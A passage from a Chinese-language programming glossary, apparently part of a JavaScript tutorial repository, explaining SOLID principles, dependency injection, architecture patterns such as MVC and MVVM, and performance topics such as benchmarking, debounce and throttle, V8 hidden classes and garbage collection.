单一职责原则说「**一个模块应该只有一个引起它变化的原因**」。注意这里的「职责」不是「只做一件事」而是「**只对一类变化负责**」——一个类如果既管数据格式又管持久化又管 HTTP 响应，那么数据库换型、接口改版、字段改名三种互不相干的变化都会逼它修改。职责的边界通常可以用「谁在提需求」来划分：同一类需求方驱动的改动才属于同一个职责。关键细节：拆分不是越细越好，把「一件事」拆成五个类同样违反原则的精神（每个类都不完整，改一个功能要动五个文件）；判断信号是「改一个功能时是否需要同时在多处小改」与「两个不相关的需求是否总撞在同一个文件里」。

**常见误解**：以为 SRP 就是「一个函数只做一件事」。粒度不是重点，**变化的来源是否单一**才是。

也见 [SOLID（SOLID 五原则）](#solidsolid-五原则)、[Separation of Concerns（关注点分离）](#separation-of-concerns关注点分离)。

示例：[`30_design_patterns/18_solid_principles.js`](30_design_patterns/18_solid_principles.js)

### Open/Closed Principle / OCP（开闭原则）

开闭原则说软件实体应当**对扩展开放、对修改封闭**：新增一种能力时，理想情况是「新增代码」而不是「修改既有代码」。它的现实意义在于——修改既有代码意味着重新测试既有行为、意味着可能弄坏已经工作的东西，而新增代码的影响面天然更小。落地手段是多态（新增子类/新实现）与注册表（把新实现注册进去，主流程不变）。关键细节：OCP 无法 100% 达成，因为总要有第一处改动的入口（注册点本身要写）；它的目标是**把改动赶到一个可预测的位置**，而不是彻底消除修改。更要避免「为假想的未来扩展点提前抽象」——那正是过度设计。

**常见误解**：以为 OCP 要求任何改动都不能碰老代码。它约束的是「新增能力」这一维度，修 bug 与内部重构当然要改老代码。

也见 [Strategy（策略模式）](#strategy策略模式)、[SOLID（SOLID 五原则）](#solidsolid-五原则)、[Over-engineering（过度设计）](#over-engineering过度设计)。

示例：[`30_design_patterns/18_solid_principles.js`](30_design_patterns/18_solid_principles.js)

### Liskov Substitution Principle / LSP（里氏替换原则）

里氏替换原则要求**子类型必须能够替换掉父类型而不破坏程序的正确性**：凡是父类能出现的地方，换成一个子类实例，程序行为应当依然符合预期。它约束的是**契约**而不是语法——子类可以做得更多，但不能要求更多（不能收紧前置条件）也不能承诺更少（不能放宽后置条件）。反面例子是经典的「正方形继承矩形」：矩形允许自由改宽高，正方形为了不变形必须让改宽同时改高，于是「把宽设为 5 再读高」在父类语境下期望得到原值，在子类下却变了——客户代码被破坏。关键细节：违反 LSP 的常见信号是 `if (obj instanceof Sub)` 或子类方法直接 `throw new Error('不支持')`。

**常见误解**：以为 LSP 只关乎继承。只要存在「接口契约 + 多个实现」，任何实现只要违背契约（比如更严格的参数要求、更弱的返回值保证）就违反了 LSP。

也见 [SOLID（SOLID 五原则）](#solidsolid-五原则)、[Interface Segregation Principle（接口隔离原则）](#interface-segregation-principle-isp接口隔离原则)。

示例：[`30_design_patterns/18_solid_principles.js`](30_design_patterns/18_solid_principles.js)

### Interface Segregation Principle / ISP（接口隔离原则）

接口隔离原则说「**不应该强迫使用者依赖它用不到的方法**」，主张把胖接口拆成若干**按使用者需求划分**的小接口。它的洞察在于：接口不是按「实现方有什么」来切，而是按「调用方要什么」来切——一个 `Worker` 接口里同时有 `work()` 和 `eat()`，对机器人实现来说 `eat()` 就是必须写个空实现或抛错的负担，而且一旦 `eat()` 的签名变了，机器人也要跟着改。关键细节：在 JS 这种没有显式 `interface` 的语言里，ISP 体现为「传进来的依赖只要求它用到的那几个方法」——例如函数只调用 `logger.info` 就不要要求传一个完整的 logger 对象，鸭子类型让「小接口」实现起来非常自然。

**常见误解**：以为 ISP 只是「接口拆得越细越好」。拆分的依据是**使用者的实际需要**，与使用者无关的拆分只是制造碎片。

也见 [Liskov Substitution Principle（里氏替换原则）](#liskov-substitution-principle-lsp里氏替换原则)、[SOLID（SOLID 五原则）](#solidsolid-五原则)。

示例：[`30_design_patterns/18_solid_principles.js`](30_design_patterns/18_solid_principles.js)

### Dependency Inversion Principle / DIP（依赖倒置原则）

依赖倒置原则有两条：**高层模块不应依赖低层模块，二者都应依赖抽象**；**抽象不应依赖细节，细节应依赖抽象**。所谓「倒置」，指的是把传统上「业务逻辑直接调用数据库」的依赖箭头翻过来——业务逻辑定义自己需要的接口（`UserRepository`），数据库实现去满足它，于是依赖方向从「业务 → 数据库」变成「两边 → 接口」。收益非常具体：换存储不影响业务代码，测试时注入内存实现即可，业务逻辑可以在任何环境下被验证。关键细节：抽象应当由**使用方**定义（调用者需要什么就声明什么），而不是由实现方把自己的一堆方法暴露出一个「接口」。

**常见误解**：把 DIP 等同于依赖注入。DIP 是**原则**（依赖谁、依赖什么形状），DI 是**手段**（怎么把依赖交进来）；不用任何框架，只要让业务函数接收一个符合自己定义的约口的对象，就已经在遵循 DIP。

也见 [Dependency Injection（依赖注入）](#dependency-injection-di依赖注入)、[Inversion of Control / IoC（控制反转）](#inversion-of-control-ioc控制反转)、[Repository Pattern（仓储模式）](#repository-pattern仓储模式)。

示例：[`30_design_patterns/18_solid_principles.js`](30_design_patterns/18_solid_principles.js)

### Dependency Injection / DI（依赖注入）

依赖注入是一种**「不要在内部自己造依赖，而是从外部接收依赖」**的写法：需要数据库就要求传入一个 `db`，需要日志器就要求传入一个 `logger`，而不是在函数体里 `import` 一个具体实现或 `new` 一个具体类。它带来三个可量化的好处：**可测试**（测试传 fake 即可，无需打补丁）、**可替换**（换实现只改装配处）、**依赖显式**（看函数签名就知道它需要什么）。注入方式有构造函数注入、函数参数注入、属性注入三种，实践中以构造函数与函数参数最为常见。关键细节：注入的应当是**抽象**（约定好的方法集合）而非具体类；DI 框架（自动装配容器）只在依赖图很大时才有价值，小型项目手工传参更清晰可控。

**常见误解**：以为 DI 必须引入框架、必须写接口。在 JS 里「把依赖当参数传进去」就是依赖注入——本仓库的所有示例都是手写注入，没有容器。

也见 [Dependency Inversion Principle / DIP（依赖倒置原则）](#dependency-inversion-principle-dip依赖倒置原则)、[Inversion of Control / IoC（控制反转）](#inversion-of-control-ioc控制反转)、[Test Dependency Injection（测试中的依赖注入）](#test-dependency-injection测试中的依赖注入)。

示例：[`30_design_patterns/19_dependency_injection.js`](30_design_patterns/19_dependency_injection.js)

### Inversion of Control / IoC（控制反转）

控制反转是一个**更上位的原则**：把「程序流程由谁掌控」这件事翻转过来——传统模式下是你的代码主动调用库（你控制流程），反转之后是框架在合适的时机调用你的代码（框架控制流程）。回调、事件监听、钩子函数、依赖注入容器都是 IoC 的具体形式，因此常被概括成「**好莱坞原则：别打给我们，我们会打给你**」。关键细节：IoC 是**设计思想**，DI 是它在「依赖获取」这个维度上的实现手段（也是目前最常被混用的一对词）；框架用 IoC 换来的是「统管生命周期与流程」的权力，代价是你的代码必须遵循它的约定。

**常见误解**：把 IoC 和 DI 当同义词。DI 是 IoC 的一种实现，但 IoC 还包括事件驱动、模板方法、生命周期钩子等一大批「由框架调用你」的机制。

也见 [Dependency Injection / DI（依赖注入）](#dependency-injection-di依赖注入)、[Template Method（模板方法模式）](#template-method模板方法模式)。

示例：[`30_design_patterns/19_dependency_injection.js`](30_design_patterns/19_dependency_injection.js)

### Separation of Concerns（关注点分离）

关注点分离主张把**不同性质的问题**分开处理：数据获取与渲染分开、业务规则与传输格式分开、日志与算法分开。每个模块只解决一类问题，于是它可以被独立理解、独立测试、独立替换。它是几乎所有架构原则的共同祖先——分层架构、单一职责、MVC、DI 都在不同粒度上执行这一条。关键细节：关注点分离的判据是「**变化的节奏是否一致**」：两类东西是否总是一起改（那就该放一起），还是各改各的（那就该分开）；分离的代价是引入了边界与跳转，过度分离会让「看懂一个功能要跳八个文件」。

**常见误解**：以为分离就是按技术类型分文件夹（`controllers/`、`services/`、`utils/`）。真正的分离依据是**职责与变化原因**，按技术类型切分常常产生一堆没有内聚力的空壳层。

也见 [Single Responsibility Principle / SRP（单一职责原则）](#single-responsibility-principle-srp单一职责原则)、[Layered Architecture（分层架构）](#layered-architecture分层架构)。

示例：[`30_design_patterns/21_architecture_patterns.js`](30_design_patterns/21_architecture_patterns.js)

### Layered Architecture（分层架构）

分层架构把系统按**抽象层次**切成若干水平层（典型是表现层、业务逻辑层、数据访问层），约定访问规则：上层可以调用下层，下层不知道上层的存在，跨层调用通常被禁止。它让每层可以独立替换（换数据库只动数据层），也让「这段代码该放哪」有了默认答案。关键细节：分层的成本是**穿透调用**——一个简单查询也要穿过三层，因此常配合「层内可以跳过无价值的中转」的务实规则；分层的边界也可以按需减少（小项目两层足够），关键不是层数而是**依赖方向单向且稳定**。本仓库的数据访问示例正是「路由层 → 服务/仓储层 → 数据库」的三层落地。

**常见误解**：以为分层就是把文件夹分成三个。真正的分层约束的是**依赖方向**，如果数据层反过来 import 了路由层（比如为了抛 HTTP 错误），层次就已经不存在了。

也见 [Separation of Concerns（关注点分离）](#separation-of-concerns关注点分离)、[Repository Pattern（仓储模式）](#repository-pattern仓储模式)、[DTO（数据传输对象）](#dto数据传输对象data-transfer-object)。

示例：[`30_design_patterns/21_architecture_patterns.js`](30_design_patterns/21_architecture_patterns.js)

### MVC（Model-View-Controller）

MVC 把界面程序切成三个角色：**Model** 持有数据与业务规则，**View** 负责把数据呈现出来，**Controller** 接收用户输入、更新 Model 并选择 View。它是最早的 GUI 架构模式之一，核心贡献是把「数据」与「呈现」解耦，让同一份数据可以有不同的展示。关键细节：MVC 在不同平台上的实际形态差别很大——服务端 MVC 里 Controller 通常返回一个渲染好的视图，浏览器端则演化出了多种变体；而且 MVC 并没有规定 Model 与 View 之间是否直接通信，这个含糊之处正是后来 MVVM、Flux 等模式试图解决的问题。

**常见误解**：以为「三层架构」就是 MVC。分层架构说的是**纵向的依赖层次**（表现/业务/数据），MVC 说的是**同一层内部的角色分工**，两者可以同时存在。

也见 [MVVM（Model-View-ViewModel）](#mvvmmodel-view-viewmodel)、[Separation of Concerns（关注点分离）](#separation-of-concerns关注点分离)、[Observer（观察者模式）](#observer观察者模式)。

示例：[`30_design_patterns/21_architecture_patterns.js`](30_design_patterns/21_architecture_patterns.js)

### MVVM（Model-View-ViewModel）

MVVM 在 MVC 的基础上引入 **ViewModel**：它把 Model 的数据转换成 View 可以直接绑定的形状（格式化、派生、校验状态），并通过**双向数据绑定**让「View 改动自动写回 ViewModel、ViewModel 改动自动刷新 View」。这样 View 里几乎不需要命令式代码，业务逻辑集中在 ViewModel 里可被独立测试。关键细节：双向绑定是 MVVM 的标志也是它的代价——数据流向变得不直观，调试时要靠工具追踪「这次更新是谁触发的」；这也是 React 系生态更倾向**单向数据流**（Flux/Redux）的原因。它与 MVC 的差别可概括为：MVC 的 Controller 处理「动作」，MVVM 的 ViewModel 持有「状态」。

**常见误解**：以为 MVVM 是 MVC 的升级版。二者是并列的架构选择，取舍在于「双向绑定带来的开发效率」是否值得「数据流可预测性的下降」。

也见 [MVC（Model-View-Controller）](#mvcmodel-view-controller)、[Observer（观察者模式）](#observer观察者模式)、[DTO（数据传输对象）](#dto数据传输对象data-transfer-object)。

示例：[`30_design_patterns/21_architecture_patterns.js`](30_design_patterns/21_architecture_patterns.js)

### DTO（数据传输对象，Data Transfer Object）

DTO 是**专门用于在层与层、进程与进程之间搬运数据的简单对象**，它没有行为，只有字段：`{ id, name, email }`。它存在的理由是「**不要把你的内部表示直接暴露出去**」——数据库实体可能有密码哈希、内部状态、懒加载关联，直接序列化给客户端既泄漏信息又把内部结构变成了公共契约（以后想重命名字段就是破坏性变更）。关键细节：DTO 应当**按消费者需要塑形**而不是照抄数据库行（对外接口里出现 `password_hash` 字段通常说明缺了 DTO）；从实体到 DTO 的转换（mapper）是一处显式边界，也是唯一需要维护映射的地方。在小项目里 DTO 可能显得多余，但一旦接口有外部使用者，它就是最低成本的信息隐藏手段。

**常见误解**：以为 DTO 只是「再多建一个类」。它不是形式主义——不建 DTO 就意味着你的数据库 schema 同时是对外 API 契约，两者被永久绑定。

也见 [Layered Architecture（分层架构）](#layered-architecture分层架构)、[Sensitive Data Exposure / Log Redaction（敏感信息泄漏与日志脱敏）](#sensitive-data-exposure-log-redaction敏感信息泄漏与日志脱敏)、[Repository Pattern（仓储模式）](#repository-pattern仓储模式)。

示例：[`30_design_patterns/21_architecture_patterns.js`](30_design_patterns/21_architecture_patterns.js)

### Anti-pattern（反模式）

反模式是**看起来像解法、实际上会带来更多问题的常见做法**，描述形式与设计模式相同（问题—诱人的方案—后果—替代方案），只是记录的是失败经验。它的价值在于「**给坏味道起名字**」：一旦团队能给「上帝对象」「意大利面条代码」「金锤子（手里有锤子看什么都像钉子）」「复制粘贴编程」「过早优化」命名，就能在评审中快速达成共识。关键细节：反模式之所以流行，通常因为它在**短期内确实有效**（复制粘贴最快、全局变量最省事），代价要到规模变大后才显现——这正是它难以劝阻的原因，也因此描述「未来的代价」比描述「当下不好看」更有说服力。

**常见误解**：以为「反模式」等于「绝对不会用的写法」。它描述的是「在错误场景下使用」，比如单例在配置对象上合理，在业务状态上就是反模式。

也见 [Over-engineering（过度设计）](#over-engineering过度设计)、[Design Pattern（设计模式）](#design-pattern设计模式)、[DRY（DRY 原则）](#dry不要重复自己dont-repeat-yourself)。

示例：[`30_design_patterns/13_pattern_selection.js`](30_design_patterns/13_pattern_selection.js)

### Over-engineering（过度设计）

过度设计指**为并不存在的需求增加复杂度**：为只有一个实现的功能抽出接口，为可能永远不会有的第二种数据库加一层抽象，为「以后可能要扩展」而引入模式与配置。它的危害是真实的——多出来的每一层抽象都要读、要维护、要跟着重构，而它带来的灵活性可能永远用不上；更糟的是，错误的抽象比没有抽象更难拆除，因为已有代码已经依赖它了。关键细节：判断依据是**已知需求而非假想需求**——「我们下个季度确实要接第二种支付」是需求，「说不定以后要支持别的」是想象；应对方法是「先写最直接的实现，等第二次真的出现重复或变化时再抽象」（Rule of Three，三次法则）。

**常见误解**：以为「过度设计」和「好的设计」界限模糊所以不必在意。它其实有明确信号：**抽象的使用者只有一处**、**接口的方法只有一个实现且看不到第二种**、**配置文件里全是从未被改过的开关**。

也见 [YAGNI](#yagni你不会需要它you-arent-gonna-need-it)、[Anti-pattern（反模式）](#anti-pattern反模式)、[Open/Closed Principle / OCP（开闭原则）](#openclosed-principle-ocp开闭原则)。

示例：[`30_design_patterns/13_pattern_selection.js`](30_design_patterns/13_pattern_selection.js)

### YAGNI（你不会需要它，You Aren't Gonna Need It）

YAGNI 是极限编程提出的一条原则：**不要实现「现在不需要、将来可能需要」的功能**。理由不是懒惰，而是**预期几乎总是错的**——你花两周做的可扩展点，很可能因为需求变化而完全用不上，而这两周里你还顺带引入了额外的复杂度、更多的代码路径和更多的测试负担。关键细节：YAGNI 常被误读成「禁止任何前瞻」，但它其实要求的是「**先做最简单能用的版本，让真实需求来驱动下一步**」；它和「重构」是一对——正因为留了简单清晰的代码，将来真需要时重构的代价才低。它反对的是提前建抽象，而不是反对思考和留有余地。

**常见误解**：把 YAGNI 当作拒绝写测试或拒绝处理错误的借口。错误处理与测试对**当前功能**是必要的，不属于「将来可能需要」。

也见 [Over-engineering（过度设计）](#over-engineering过度设计)、[KISS（KISS 原则）](#kiss保持简单keep-it-simple-stupid)。

示例：[`30_design_patterns/13_pattern_selection.js`](30_design_patterns/13_pattern_selection.js)

### KISS（保持简单，Keep It Simple, Stupid）

KISS 主张**在能满足需求的前提下选最简单的方案**。它的依据很实在：复杂度是 bug 的温床（分支越多、状态越多，组合爆炸越厉害），也是理解成本的来源（同事读 20 行直白代码花 10 秒，读 5 层抽象的 200 行花 10 分钟）。关键细节：KISS 与「写得粗糙」不同——简单指**结构简单、概念少**，而不是「不管边界情况、不写错误处理」；恰恰相反，把边界情况处理干净往往能让主流程更简单。它与 YAGNI、DRY 构成一组制衡：DRY 要求消除重复（引入抽象），KISS 与 YAGNI 则提醒抽象本身有成本，三者需要一起权衡而不是各自走到极端。

**常见误解**：以为「简单」等于「短」。把三个函数压成一行嵌套三元表达式只是更短，不是更简单。

也见 [DRY（DRY 原则）](#dry不要重复自己dont-repeat-yourself)、[YAGNI](#yagni你不会需要它you-arent-gonna-need-it)、[Over-engineering（过度设计）](#over-engineering过度设计)。

示例：[`30_design_patterns/13_pattern_selection.js`](30_design_patterns/13_pattern_selection.js)

### DRY（不要重复自己，Don't Repeat Yourself）

DRY 的准确表述是「**每一处知识都应当在整个系统中只有一个权威的、无歧义的表示**」。它的关键词是**知识**而不是「代码文本」——两段长得一样的代码如果表达的是不同的业务规则，它们的「巧合重复」不违反 DRY，也不该被强行合并。违反 DRY 的代价是「改一处忘一处」：业务规则改了三个地方漏了一个，就是线上 bug。关键细节：滥用 DRY 是过度设计最常见的来源——为了消除三行相似代码而造一个带六个参数的通用函数，结果每次调用都要读半天文档，这属于把重复换成了抽象复杂度。判别标准是「**它们会一起变化吗**」（会，则合并；不会，则保持分开，哪怕今天看起来一样）。

**常见误解**：把 DRY 当成「不许出现重复代码」。复制粘贴两次以等待第三次出现（三次法则），往往比立刻抽象更明智。

也见 [KISS（KISS 原则）](#kiss保持简单keep-it-simple-stupid)、[Over-engineering（过度设计）](#over-engineering过度设计)、[Anti-pattern（反模式）](#anti-pattern反模式)。

示例：[`30_design_patterns/13_pattern_selection.js`](30_design_patterns/13_pattern_selection.js)

## 性能与内存

### Profiling（性能剖析）

性能剖析是**用测量代替猜测**来定位性能瓶颈的过程：先让程序跑起来并采集数据（函数调用耗时、内存分配、事件循环阻塞），再从数据里找出真正的热点。它之所以不可省略，是因为**直觉在性能问题上极不可靠**——开发者猜的瓶颈往往与实际相差一个数量级，而优化一个不是瓶颈的地方收益为零。关键细节：剖析必须在**接近真实的数据规模与运行环境**下进行（用 10 条数据测排序毫无意义），且要先定义指标（延迟、吞吐、内存峰值）再采集；采样式剖析器开销小、适合生产，插桩式更精确、适合本地；在 Node 里可以用 `--prof`、`perf_hooks` 与 inspector，在浏览器里用 Performance 面板。

**常见误解**：以为「看一眼代码就知道哪里慢」。真正耗时往往在你不曾怀疑的地方（序列化、正则回溯、意外的 N+1 查询、布局重排）。

也见 [Benchmark（基准测试）](#benchmark基准测试)、[Heap Snapshot（堆快照）](#heap-snapshot堆快照)、[Web Vitals（Web 核心指标）](#web-vitalsweb-核心指标)。

示例：[`31_performance_and_memory/13_memory_profiling.js`](31_performance_and_memory/13_memory_profiling.js)

### Benchmark（基准测试）

基准测试是在**受控条件下重复运行同一段代码并测量其耗时**，用来比较两种实现或验证优化效果。它比「随手 `console.time` 一次」严格得多：需要预热、多轮采样、取统计量（中位数等）并关注离散程度。关键细节：JS 基准测试有三个经典陷阱——**预热不足**（前几轮被解释执行或基线编译，后面才走 JIT 优化后的代码，混在一起平均毫无意义）、**死代码消除**（结果没被使用的计算可能被引擎整段删掉，于是「快」得离谱，需要把结果消费掉）、以及**微基准与真实场景脱节**（测出的结论只能在它测的那个条件下成立）。所以结论要配合真实剖析验证。

**常见误解**：以为「跑一次 0.5ms」是可靠数据。单次测量几乎必然被 GC、JIT 与系统调度干扰，中位数与足够的样本量才是可比较的基础。

也见 [Warmup（预热）](#warmup预热)、[Profiling（性能剖析）](#profiling性能剖析)、[Big O（大 O 表示法）](#big-o大-o-表示法)。

示例：[`31_performance_and_memory/11_benchmark_basics.js`](31_performance_and_memory/11_benchmark_basics.js)

### Warmup（预热）

预热指在正式测量前**先空跑若干轮**，让引擎有机会把热点函数编译成优化后的机器码、让内联缓存稳定下来、让懒初始化的结构就位。不预热时，前几轮测到的是「解释执行 + 首次编译」的开销，会把慢实现的差距掩盖、或让快实现看起来忽快忽慢。关键细节：预热轮数取决于函数复杂度与引擎策略，实践中常先跑几千到几万次再开始计时；预热还有一个副作用值得警惕——**它可能掩盖真实的首次调用成本**，如果你的场景是「冷启动只跑一次」，那么冷态数据才是你要的，此时不该预热。

**常见误解**：以为预热只是「让缓存热起来」。它主要影响的是**JIT 编译层级与内联缓存的成熟度**，这两者会改变代码的执行路径本身。

也见 [Benchmark（基准测试）](#benchmark基准测试)、[Inline Cache（内联缓存）](#inline-cache内联缓存)。

示例：[`31_performance_and_memory/11_benchmark_basics.js`](31_performance_and_memory/11_benchmark_basics.js)

### Dead Code Elimination（死代码消除）

死代码消除指编译器/引擎**把结果从未被使用、且没有副作用可观察的计算整段删掉**。它本是好事，但在做性能测试时会造成荒谬结果：如果基准测试里算了 `sum` 却从不打印也不返回，引擎可能直接把整个循环优化掉，于是「一百亿次加法」耗时 0 毫秒。关键细节：防御办法是**消费结果**——把它累加进一个在循环外声明、最后 `console.log` 或返回的变量，或者用 `globalThis` 赋值让引擎无法证明它不可观察；同理，`typeof x` 这类「看起来有副作用」的调用不能随便拿来当消费手段，因为引擎清楚它无副作用。

**常见误解**：把「我的优化让代码快了 100 倍」当真。先检查代码是不是被整段删掉了——基准测试异常漂亮的结果十有八九来源于此。

也见 [Benchmark（基准测试）](#benchmark基准测试)、[Warmup（预热）](#warmup预热)。

示例：[`31_performance_and_memory/11_benchmark_basics.js`](31_performance_and_memory/11_benchmark_basics.js)

### Big O（大 O 表示法）

大 O 描述**算法耗时（或空间）随输入规模增长的趋势**，忽略常数与低阶项：`O(1)` 不随规模变化，`O(log n)` 对数增长，`O(n)` 线性，`O(n log n)` 常见于高效排序，`O(n²)` 是嵌套循环的典型信号。它关心的不是「小数据下谁快」而是「数据变大后会怎样」——`O(n²)` 在 100 条时可能比 `O(n log n)` 还快（常数更小），在 100 万条时则慢到不可用。关键细节：大 O 只描述**主项的增长**，因此常数因子极其重要（同一个 `O(n)` 的两个实现可能差 10 倍）；分析时要注意**隐式复杂度**——`arr.includes()` 是 `O(n)`、`arr.shift()` 也可能是 `O(n)`、对象属性访问在大 O 记法里写 `O(1)` 但实际上依赖 V8 的隐藏类优化。

**常见误解**：以为「复杂度低就一定更快」，于是在只看得到几十个元素的地方把可读的数组换成 Set；也见本仓库对「小数据下大 O 无意义」的实测。

也见 [Profiling（性能剖析）](#profiling性能剖析)、[Benchmark（基准测试）](#benchmark基准测试)、[Memoization（记忆化）](#memoization记忆化)。

示例：[`31_performance_and_memory/04_algorithm_complexity.js`](31_performance_and_memory/04_algorithm_complexity.js)

### Debounce（防抖）

防抖让函数在**停止被触发一段时间之后才真正执行一次**：事件每来一次就重置计时器，只有安静满 `delay` 毫秒才落地。典型用途是搜索框输入（用户还在打字时不必发请求）、窗口 resize 结束时重算布局、表单校验。关键细节：实现要点是用闭包保存 `timer`，每次调用 `clearTimeout` 再 `setTimeout`；通常还要支持 `cancel()`（组件卸载时必须取消，否则泄漏）、`leading`（首次立即执行，用于按钮防连点）与 `maxWait`（防止持续触发导致永不执行）。它与节流的区别见下一条。

**常见误解**：以为防抖会让「所有调用被合并成一次」。合并的是**连续期间的多次触发**，如果两次触发之间间隔超过 `delay`，它们仍会各自执行一次。

也见 [Throttle（节流）](#throttle节流)、[Race Condition（竞态条件）](#race-condition竞态条件)、[Memoization（记忆化）](#memoization记忆化)。

示例：[`31_performance_and_memory/01_debounce.js`](31_performance_and_memory/01_debounce.js)

### Throttle（节流）

节流让函数在**一段时间内最多执行一次**：无论事件触发多密集，执行频率被限制在 `delay` 毫秒一次，中间多余的触发被丢弃或延后。它适用于「过程中就要持续反馈」的场景——滚动位置更新、鼠标移动绘制、拖拽时的坐标上报、滚动加载。关键细节：常见三种实现——时间戳版（首次立即执行，最后一次可能丢失）、定时器版（首次延迟执行，末次会补上）、以及结合版（首次立即 + 末尾补执行，最符合直觉）；`leading`/`trailing` 两个开关决定了「第一次要不要马上执行」与「结束后要不要补一次」。

**常见误解**：把节流和防抖混用。一句话区分：**防抖是「等你停下来再做」，节流是「我按固定节奏做」**。搜索建议用防抖（不需要中间态），滚动进度条用节流（需要连续反馈）。

也见 [Debounce（防抖）](#debounce防抖)、[Long Task（长任务）](#long-task长任务)。

示例：[`31_performance_and_memory/02_throttle.js`](31_performance_and_memory/02_throttle.js)

### Memoization（记忆化）

记忆化是**缓存函数的计算结果、用入参作为键，下次相同输入直接返回缓存**的优化手段，本质上是「用内存换时间」。它成立的三个前提是：函数是**纯函数**（同输入必同输出、无副作用）、**入参可被稳定地序列化成键**、以及**重复调用足够频繁**（否则缓存只增内存不省时间）。关键细节：键的构造是最大的坑——对象参数直接当键会失效（每个字面量都是新引用），用 `JSON.stringify` 又会因键顺序不同而产生重复项，且无法处理 `undefined`/函数/循环引用；实践中常用「首个参数为原始值 + 单键 Map」或自定义 `resolver`。还要考虑淘汰策略（LRU）与失效（TTL、外部状态变化时手动清空），否则缓存会变成内存泄漏源。

**常见误解**：以为记忆化是「无脑加速」。对不纯的函数（依赖时间、随机数、外部状态）做记忆化会产生**错误的返回值**，比慢更糟。

也见 [Flyweight（享元模式）](#flyweight享元模式)、[Memory Leak（内存泄漏）](#memory-leak内存泄漏)、[Debounce（防抖）](#debounce防抖)。

示例：[`31_performance_and_memory/03_memoization.js`](31_performance_and_memory/03_memoization.js)

### Race Condition（竞态条件）

竞态条件指**多个异步操作的执行顺序不确定**，导致结果依赖于「谁先完成」而产生的不确定性缺陷。最典型的场景是两次并发请求返回顺序颠倒：用户先搜「ab」再搜「abc」，结果「ab」的响应后到，界面显示的是过期结果。JS 虽然是单线程，但异步任务交织同样会造成竞态——这与多线程里的数据竞争（data race）不是一回事，`await` 之间任何时刻都可能插入其它任务。常见解法是给请求编号只采纳最新一次、用 `AbortController` 取消过期请求、或者用防抖合并高频触发。

**常见误解**：以为「JS 单线程所以没有竞态」。单线程只保证「同一时刻只有一段代码在跑」，不保证「多个异步操作的先后关系符合你的假设」。

也见 [Debounce（防抖）](#debounce防抖)、[Idempotency（幂等性）](#idempotency幂等性)、[Testing Async Code（异步代码测试）](#testing-async-code异步代码测试)。

示例：[`31_performance_and_memory/01_debounce.js`](31_performance_and_memory/01_debounce.js)、[`28_testing/06_testing_async_code.js`](28_testing/06_testing_async_code.js)

### Object Shape / Hidden Class（对象形状与隐藏类）

隐藏类（V8 的叫法，SpiderMonkey 叫 shape）是引擎为**每个具有相同属性布局的对象**建立的一份内部描述：属性的名字、顺序、类型与内存偏移。同一份构造函数创建的对象共享同一个隐藏类，于是属性访问能被优化成「基址 + 固定偏移」的一次内存读取，几乎和访问数组元素一样快。关键细节：一旦对象的**属性被增删、或顺序不同、或类型改变**，隐藏类就会迁移或重建，属性访问退化成哈希查找，性能可能相差一个数量级；因此最佳实践是「构造函数里一次声明全部属性、按相同顺序赋初值、不要用 `delete`（会创建新的隐藏类并让对象变成字典模式）」。

**常见误解**：以为这只是引擎内部细节、写代码时无所谓。对热路径上执行百万次的对象操作来说，形状稳定与否是最容易获得的一笔性能收益。

也见 [Inline Cache（内联缓存）](#inline-cache内联缓存)、[Deoptimization（去优化）](#deoptimization去优化)。

示例：[`31_performance_and_memory/08_object_shape_optimization.js`](31_performance_and_memory/08_object_shape_optimization.js)

### Inline Cache（内联缓存）

内联缓存（IC）是引擎在**每个属性访问点**（如 `obj.x`）缓存「上次访问时对象的隐藏类是什么、`x` 在什么偏移」的机制。下次执行到这里时，如果隐藏类没变，就直接按缓存的偏移取值（单态命中，最快）；如果遇到了第二种形状，就退化为多态缓存（比较若干种形状）；形状太多则变成超多态（megamorphic），退化成哈希查找。关键细节：IC 是**按代码位置**而不是按对象生效的，所以「同一个函数被喂了多种形状的对象」会让该访问点变多态——这就是为什么给同一个函数传不同结构的对象集合会明显变慢；保持调用点的形状单态是引擎优化中最实用的一条建议。

**常见误解**：以为「JS 属性访问都是 O(1)」所以无所谓。它在大 O 意义上是常数，但常数因子可以差十倍以上。

也见 [Object Shape / Hidden Class（对象形状与隐藏类）](#object-shape-hidden-class对象形状与隐藏类)、[Deoptimization（去优化）](#deoptimization去优化)。

示例：[`31_performance_and_memory/08_object_shape_optimization.js`](31_performance_and_memory/08_object_shape_optimization.js)

### Deoptimization（去优化）

去优化是引擎在**优化编译时所做的假设被打破**后，把已经优化过的代码**回退到未优化版本**继续执行的过程。V8 的优化编译器会根据运行时观察做出激进假设（「这里收到的总是数字」「这个对象的形状总是 X」「这个函数从不被重新赋值」），一旦假设失效就必须「脱下优化外套」重来。常见触发原因：类型混用（`number` 的累加器里突然出现字符串）、给对象增删属性、对函数声明后重新赋值、超过参数个数上限、`try/catch` 或 `with` 让变量作用域无法静态确定、以及 `arguments` 的滥用。关键细节：单次去优化代价不大，但**反复优化又反复去优化**（optimize-deopt 循环）会让热路径比从不优化还慢。

**常见误解**：以为「优化过的代码会一直保持优化」。优化是基于**观察到的历史**做的投机，历史变了结论就要撤回。

也见 [Inline Cache（内联缓存）](#inline-cache内联缓存)、[Object Shape / Hidden Class（对象形状与隐藏类）](#object-shape-hidden-class对象形状与隐藏类)。

示例：[`31_performance_and_memory/08_object_shape_optimization.js`](31_performance_and_memory/08_object_shape_optimization.js)

### Garbage Collection / GC（垃圾回收）

垃圾回收是运行时**自动回收不再被使用的内存**的机制，让开发者不必手工释放内存。它判断「不再使用」的依据不是「作用域结束了没有」，而是**可达性**：从根集合（全局对象、当前调用栈上的局部变量、闭包引用等）出发能走到的对象就是活的，走不到的就是垃圾。关键细节：GC 是**非确定性的**——你无法知道它何时运行、一次回收多少，因此不能依赖它做资源管理（文件句柄、网络连接必须显式释放）；同时 GC 会**暂停执行**（stop-the-world），虽然现代引擎已把大部分工作并发化，但在分配速率极高的场景下 GC 停顿仍会造成可感知的卡顿，减少短命对象的分配往往比「优化算法」更有效。

**常见误解**：以为「有 GC 就不会内存泄漏」。只要还有一条从根可达的引用链指向不再需要的对象（比如数组里忘了移除的监听器），GC 就无法回收它。

也见 [Reachability（可达性）](#reachability可达性)、[Memory Leak（内存泄漏）](#memory-leak内存泄漏)、[Generational GC（分代回收）](#generational-gc分代回收)。

示例：[`31_performance_and_memory/12_gc_internals.js`](31_performance_and_memory/12_gc_internals.js)

### Generational GC（分代回收）

